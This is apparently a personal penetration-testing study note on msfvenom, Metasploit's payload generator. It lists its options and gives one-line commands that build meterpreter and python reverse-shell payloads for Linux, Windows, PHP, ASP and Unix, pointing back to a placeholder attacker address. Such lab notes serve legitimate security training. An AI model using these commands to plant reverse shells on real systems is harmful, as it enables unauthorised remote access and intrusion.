**Type:** #type/tool
**Tags:**  #goal/payload
**Link:** 
**Purpose:** generate all kinds of payloads

---
# Info
part of [[3_Tools/Metasploit framework/msfconsole]] framework
Used to generate payloads and reverse shells for many purposes
# Usage
`msfvenom -p <PAYLOAD> <OPTIONS>`
Important options:
`-f`: output file format
`-o`: output file path
`LHOST=`IP of attacker
`LPORT=`port of attacker

**list things** 
possible payloads:`msfvenom --list payloads`
possible formats:  `--list payloads`

when generating PHP payload: the starting php tag is commented out delete the comment to make the payload valid

info on listener in [[3_Tools/Metasploit framework/msfconsole]]

## useful payload commands
- linux elf: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`
- windows exe: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`
- PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
- ASP: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`
- unix python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`